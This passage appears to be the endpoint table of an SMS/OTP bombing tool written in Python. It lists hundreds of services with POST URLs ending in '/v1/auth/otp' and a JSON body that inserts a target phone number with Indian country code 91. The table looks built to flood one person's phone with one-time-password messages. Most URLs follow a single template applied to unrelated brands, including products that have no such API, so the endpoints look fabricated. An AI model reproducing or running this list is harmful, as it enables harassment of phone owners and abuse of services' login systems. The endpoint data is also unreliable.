    ("Slack","POST","https://api.slack.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zoom","POST","https://api.zoom.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MS Teams","POST","https://api.teams.microsoft.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Google Meet","POST","https://api.meet.google.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Cisco Webex","POST","https://api.webex.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Adobe","POST","https://api.adobe.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Figma","POST","https://api.figma.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Canva","POST","https://api.canva.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Sketch","POST","https://api.sketch.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("InVision","POST","https://api.invisionapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Marvel","POST","https://api.marvelapp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Proto.io","POST","https://api.proto.io/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("UXPin","POST","https://api.uxpin.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Balsamiq","POST","https://api.balsamiq.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Axure","POST","https://api.axure.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MockFlow","POST","https://api.mockflow.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Wireframe","POST","https://api.wireframe.cc/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Mockplus","POST","https://api.mockplus.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("JustInMind","POST","https://api.justinmind.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pidoco","POST","https://api.pidoco.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("HotGloo","POST","https://api.hotgloo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("FluidUI","POST","https://api.fluidui.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Framer","POST","https://api.framer.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Origami","POST","https://api.origami.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Principle","POST","https://api.principle.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Keynote","POST","https://api.keynote.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("PowerPoint","POST","https://api.powerpoint.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Google Slides","POST","https://api.slides.google.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Prezi","POST","https://api.prezi.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SlideShare","POST","https://api.slideshare.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("HaikuDeck","POST","https://api.haikudeck.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Emaze","POST","https://api.emaze.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Sway","POST","https://api.sway.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Visme","POST","https://api.visme.co/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Beautiful.ai","POST","https://api.beautiful.ai/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Gamma","POST","https://api.gamma.app/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Tome","POST","https://api.tome.app/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pitch","POST","https://api.pitch.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zight","POST","https://api.zight.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Loom","POST","https://api.loom.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ScreenRec","POST","https://api.screenrec.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("OBS","POST","https://api.obsproject.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Streamlabs","POST","https://api.streamlabs.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Twitch","POST","https://api.twitch.tv/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("YouTube","POST","https://www.youtube.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Reddit","POST","https://api.reddit.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TikTok","POST","https://api.tiktok.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Snapchat Login","POST","https://accounts.snapchat.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pinterest","POST","https://api.pinterest.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Tumblr","POST","https://api.tumblr.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Flickr","POST","https://api.flickr.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Vimeo","POST","https://api.vimeo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Dailymotion","POST","https://api.dailymotion.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SoundCloud","POST","https://api.soundcloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Spotify","POST","https://api.spotify.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Apple Music","POST","https://api.applemusic.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Amazon Music","POST","https://api.amazonmusic.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Gaana","POST","https://api.gaana.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("JioSaavn","POST","https://api.jiosaavn.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Wynk","POST","https://api.wynk.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Hungama Music","POST","https://api.hungama.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("YouTube Music","POST","https://api.youtube.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Tidal","POST","https://api.tidal.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Deezer","POST","https://api.deezer.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pandora","POST","https://api.pandora.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("iHeartRadio","POST","https://api.iheartradio.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SiriusXM","POST","https://api.siriusxm.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TuneIn","POST","https://api.tunein.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Radioplayer","POST","https://api.radioplayer.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Audible","POST","https://api.audible.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Storytel","POST","https://api.storytel.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Kobo","POST","https://api.kobo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Scribd","POST","https://api.scribd.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Medium","POST","https://api.medium.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Substack","POST","https://api.substack.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Ghost","POST","https://api.ghost.org/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("WordPress","POST","https://api.wordpress.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Blogger","POST","https://api.blogger.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Tumblr Login","POST","https://api.tumblr.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("LiveJournal","POST","https://api.livejournal.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Xing","POST","https://api.xing.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Viadeo","POST","https://api.viadeo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("About.me","POST","https://api.about.me/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("AngelList","POST","https://api.angellist.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ProductHunt","POST","https://api.producthunt.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("IndieHackers","POST","https://api.indiehackers.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Dev.to","POST","https://api.dev.to/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Hashnode","POST","https://api.hashnode.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Devfolio","POST","https://api.devfolio.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Hackathon","POST","https://api.hackathon.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MLH","POST","https://api.mlh.io/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("HackerRank","POST","https://api.hackerrank.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("LeetCode","POST","https://api.leetcode.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("CodeChef","POST","https://api.codechef.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Codeforces","POST","https://api.codeforces.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("AtCoder","POST","https://api.atcoder.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TopCoder","POST","https://api.topcoder.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SPOJ","POST","https://api.spoj.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("HackerEarth","POST","https://api.hackerearth.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Codewars","POST","https://api.codewars.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Codingame","POST","https://api.codingame.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pluralsight","POST","https://api.pluralsight.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Coursera","POST","https://api.coursera.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("edX","POST","https://api.edx.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Udacity","POST","https://api.udacity.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Udemy","POST","https://api.udemy.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Skillshare","POST","https://api.skillshare.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("LinkedIn Learning","POST","https://api.linkedinlearning.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MasterClass","POST","https://api.masterclass.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Brilliant","POST","https://api.brilliant.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Khan Academy","POST","https://api.khanacademy.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Byjus2","POST","https://api.byjus.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Unacademy","POST","https://api.unacademy.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Vedantu","POST","https://api.vedantu.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Toppr","POST","https://api.toppr.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Meritnation","POST","https://api.meritnation.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Aakash2","POST","https://api.aakash.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("FIITJEE","POST","https://api.fiitjee.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Resonance","POST","https://api.resonance.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Allen","POST","https://api.allen.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Narayana","POST","https://api.narayana.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Chaitanya","POST","https://api.chaitanya.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Sri Chaitanya","POST","https://api.srichaitanya.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Career Point","POST","https://api.careerpoint.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bansal Classes","POST","https://api.bansalclasses.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Kota Coaching","POST","https://api.kotacoaching.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Alakh Pandey","POST","https://api.alakhpandey.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Physics Wallah","POST","https://api.physicswallah.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Unacademy Plus","POST","https://api.unacademyplus.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Vedantu Pro","POST","https://api.vedantupro.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BYJUS Class","POST","https://api.byjusclass.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Toppr Anytime","POST","https://api.topprany.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Meritnation Plus","POST","https://api.meritnationplus.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Aakash iTutor","POST","https://api.aakashitutor.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("FIITJEE Online","POST","https://api.fiitjeeonline.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Resonance Online","POST","https://api.resonanceonline.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Allen Online","POST","https://api.allenonline.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Narayana Online","POST","https://api.narayanaonline.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Chaitanya Online","POST","https://api.chaitanyaonline.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SriChaitanya Online","POST","https://api.srichaitanyaonline.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("CareerPoint Online","POST","https://api.careerpointonline.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bansal Online","POST","https://api.bansalonline.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Kota Online","POST","https://api.kotaonline.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("WhatsApp Web","POST","https://web.whatsapp.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Telegram Web","POST","https://web.telegram.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Signal Web","POST","https://web.signal.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Discord Web","POST","https://discord.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Slack Web","POST","https://slack.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Teams Web","POST","https://teams.microsoft.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zoom Web","POST","https://zoom.us/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("GoogleMeet Web","POST","https://meet.google.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("CiscoWebex Web","POST","https://webex.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Adobe Web","POST","https://adobe.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Figma Web","POST","https://figma.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Canva Web","POST","https://canva.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Sketch Web","POST","https://sketch.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("InVision Web","POST","https://invisionapp.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Marvel Web","POST","https://marvelapp.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Proto Web","POST","https://proto.io/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("UXPin Web","POST","https://uxpin.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Balsamiq Web","POST","https://balsamiq.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Axure Web","POST","https://axure.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MockFlow Web","POST","https://mockflow.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Wireframe Web","POST","https://wireframe.cc/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Mockplus Web","POST","https://mockplus.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("JustInMind Web","POST","https://justinmind.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pidoco Web","POST","https://pidoco.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("HotGloo Web","POST","https://hotgloo.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("FluidUI Web","POST","https://fluidui.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Framer Web","POST","https://framer.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Origami Web","POST","https://origami.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Principle Web","POST","https://principle.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Keynote Web","POST","https://keynote.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("PowerPoint Web","POST","https://powerpoint.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Slides Web","POST","https://slides.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Prezi Web","POST","https://prezi.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SlideShare Web","POST","https://slideshare.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("HaikuDeck Web","POST","https://haikudeck.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Emaze Web","POST","https://emaze.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Sway Web","POST","https://sway.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Visme Web","POST","https://visme.co/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Beautiful Web","POST","https://beautiful.ai/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Gamma Web","POST","https://gamma.app/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Tome Web","POST","https://tome.app/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pitch Web","POST","https://pitch.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zight Web","POST","https://zight.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Loom Web","POST","https://loom.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ScreenRec Web","POST","https://screenrec.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("OBS Web","POST","https://obsproject.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Streamlabs Web","POST","https://streamlabs.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Restream","POST","https://restream.io/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("StreamElements","POST","https://streamelements.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Nightbot","POST","https://nightbot.tv/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Mobcrush","POST","https://api.mobcrush.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bigo Live","POST","https://api.bigo.tv/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Mico","POST","https://api.mico.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Azar","POST","https://api.azar.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Hago","POST","https://api.hago.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Yalla","POST","https://api.yalla.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Chamet","POST","https://api.chamet.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Lemo","POST","https://api.lemo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Tumile","POST","https://api.tumile.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MeeLive","POST","https://api.meelive.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("StarMaker","POST","https://api.starmaker.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Smule","POST","https://api.smule.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Starmaker India","POST","https://api.starmaker.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Smule India","POST","https://api.smule.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Triller","POST","https://api.triller.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Likee","POST","https://api.likee.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bigo Live India","POST","https://api.bigolive.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Kuaishou","POST","https://api.kuaishou.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Douyin","POST","https://api.douyin.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Helo","POST","https://api.helo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zili","POST","https://api.zili.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Vigo","POST","https://api.vigo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Uplive","POST","https://api.uplive.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("17Live","POST","https://api.17live.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pococha","POST","https://api.pococha.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bambuser","POST","https://api.bambuser.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("StreamYard","POST","https://api.streamyard.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Riverside","POST","https://api.riverside.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SquadCast","POST","https://api.squadcast.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zencastr","POST","https://api.zencastr.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Anchor","POST","https://api.anchor.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Spotify Podcasters","POST","https://api.spotifypodcasters.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Simplecast","POST","https://api.simplecast.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Podbean","POST","https://api.podbean.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Transistor","POST","https://api.transistor.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Castos","POST","https://api.castos.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RedCircle","POST","https://api.redcircle.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Acast","POST","https://api.acast.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Megaphone","POST","https://api.megaphone.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Art19","POST","https://api.art19.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Libsyn","POST","https://api.libsyn.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Blubrry","POST","https://api.blubrry.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Soundcloud Repost","POST","https://api.soundcloudrepost.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Mixcloud","POST","https://api.mixcloud.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Hearthis","POST","https://api.hearthis.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Audiomack","POST","https://api.audiomack.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bandcamp","POST","https://api.bandcamp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Soundtrap","POST","https://api.soundtrap.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BandLab","POST","https://api.bandlab.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Soundtrap India","POST","https://api.soundtrap.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BandLab India","POST","https://api.bandlab.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SoundCloud India","POST","https://api.soundcloud.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Mixcloud India","POST","https://api.mixcloud.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Audiomack India","POST","https://api.audiomack.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bandcamp India","POST","https://api.bandcamp.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Hearthis India","POST","https://api.hearthis.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SoundTrap Pro","POST","https://api.soundtrappro.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BandLab Pro","POST","https://api.bandlabpro.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Spotify Studio","POST","https://api.spotifystudio.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Apple Podcast Studio","POST","https://api.applepodcaststudio.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Google Podcast Studio","POST","https://api.googlepodcaststudio.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Amazon Music Studio","POST","https://api.amazonmusicstudio.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Tidal Studio","POST","https://api.tidalstudio.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Deezer Studio","POST","https://api.deezerstudio.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("YouTube Music Studio","POST","https://api.youtubemusicstudio.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Vevo","POST","https://api.vevo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MTV","POST","https://api.mtv.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("VH1","POST","https://api.vh1.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Comedy Central","POST","https://api.comedycentral.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
